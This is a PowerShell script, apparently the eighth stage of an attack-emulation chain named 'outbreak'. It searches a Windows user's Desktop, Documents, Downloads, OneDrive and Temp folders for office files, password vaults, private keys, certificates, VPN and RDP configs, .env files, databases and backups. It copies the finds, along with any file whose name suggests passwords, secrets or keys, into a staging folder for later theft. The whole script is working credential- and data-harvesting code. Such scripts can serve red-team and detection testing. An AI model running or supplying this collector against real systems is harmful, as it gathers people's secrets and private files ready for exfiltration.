<#
.SYNOPSIS
    Stage 08 — Data Collection (Real Actions)
.DESCRIPTION
    Searches for sensitive files on the local system: documents,
    spreadsheets, passwords, config files, databases, key material,
    and backup files. Copies interesting finds to a staging directory.
#>

Write-Host "============================================" -ForegroundColor Cyan
Write-Host " STAGE 08: DATA COLLECTION" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

$stagingDir = "$env:USERPROFILE\AppData\Local\Temp\outbreak_collection"
if (-not (Test-Path $stagingDir)) {
    New-Item -Path $stagingDir -ItemType Directory -Force | Out-Null
}

Write-Host "[*] Staging directory: $stagingDir" -ForegroundColor Gray
Write-Host ""

# ── Search Patterns ──
$patterns = @(
    # Documents
    "*.xls", "*.xlsx", "*.doc", "*.docx", "*.pdf", "*.ppt", "*.pptx",
    # Credentials & config
    "*.kdbx", "*.kdb", "*.env", "*.config", "*.ini",
    "*.pem", "*.key", "*.pfx", "*.p12", "*.ovpn",
    "passwords*", "credential*", "secret*", "token*", "login*",
    # Databases & backups
    "*.sql", "*.sqlite", "*.db", "*.bak", "*.backup", "*.dump",
    "*.rdp", "*.vnc", "*.mst",
    "*.ps1", "*.bat", "*.vbs",
    "*.xml", "*.json", "*.yaml", "*.yml"
)

$searchPaths = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\OneDrive",
    "$env:USERPROFILE\AppData\Local\Temp"
)

# ── Search ──
Write-Host "[*] SEARCHING FOR SENSITIVE FILES" -ForegroundColor Yellow
Write-Host ""

$totalFound = 0
$totalCopied = 0

foreach ($searchPath in $searchPaths) {
    if (-not (Test-Path $searchPath)) { continue }
    
    Write-Host "  Scanning: $searchPath" -ForegroundColor Gray
    
    foreach ($pattern in $patterns) {
        try {
            $files = Get-ChildItem -Path $searchPath -Filter $pattern -File -Recurse -ErrorAction SilentlyContinue -Depth 3 | 
                     Where-Object { $_.Length -gt 0 } |
                     Select-Object -First 10
                     
            foreach ($file in $files) {
                $totalFound++
                $sizeKB = [math]::Round($file.Length / 1KB, 1)
                Write-Host "    [FOUND] $($file.Name) ($sizeKB KB)" -ForegroundColor Yellow
                
                # Copy to staging
                try {
                    $destName = "$($file.Directory.Name)_$($file.Name)"
                    Copy-Item $file.FullName "$stagingDir\$destName" -Force -ErrorAction SilentlyContinue
                    $totalCopied++
                    Write-Host "      → Staged as: $destName" -ForegroundColor Gray
                } catch {}
            }
        } catch {}
    }
}

Write-Host ""
Write-Host "  [+] Total files found: $totalFound" -ForegroundColor Green
Write-Host "  [+] Files copied: $totalCopied" -ForegroundColor Green
Write-Host ""

# ── Search for password files specifically ──
Write-Host "[*] PASSWORD FILE SEARCH" -ForegroundColor Yellow
$passwordPatterns = @("*password*", "*credential*", "*secret*", "*key*", "*vault*", "*auth*")
foreach ($pattern in $passwordPatterns) {
    try {
        $files = Get-ChildItem -Path "$env:USERPROFILE" -Filter $pattern -File -Recurse -ErrorAction SilentlyContinue -Depth 2 |
                 Where-Object { $_.Length -gt 0 -and $_.Length -lt 1MB }
        foreach ($file in $files) {
            Write-Host "  [!] $($file.FullName)" -ForegroundColor Red
            try {
                Copy-Item $file.FullName "$stagingDir\password_$($file.Name)" -Force -ErrorAction SilentlyContinue
            } catch {}
        }
    } catch {}
}
Write-Host ""

# ── Staged File Summary ──
Write-Host "[*] STAGED FILES IN COLLECTION" -ForegroundColor Yellow
$staged = Get-ChildItem $stagingDir -ErrorAction SilentlyContinue
$totalSize = ($staged | Measure-Object -Property Length -Sum).Sum
$totalSizeMB = [math]::Round($totalSize / 1MB, 2)
Write-Host "  Files staged: $($staged.Count)"
Write-Host "  Total size:   $totalSizeMB MB"
Write-Host "  Directory:    $stagingDir"
Write-Host ""

if ($staged.Count -gt 0) {
    Write-Host "  Staged files:" -ForegroundColor Gray
    $staged | Select-Object Name, Length | ForEach-Object {
        $sizeKB = [math]::Round($_.Length / 1KB, 1)
        Write-Host "    $($_.Name)  ($sizeKB KB)" -ForegroundColor Gray
    }
}
Write-Host ""

Write-Host "============================================" -ForegroundColor Green
Write-Host " STAGE 08 COMPLETE" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green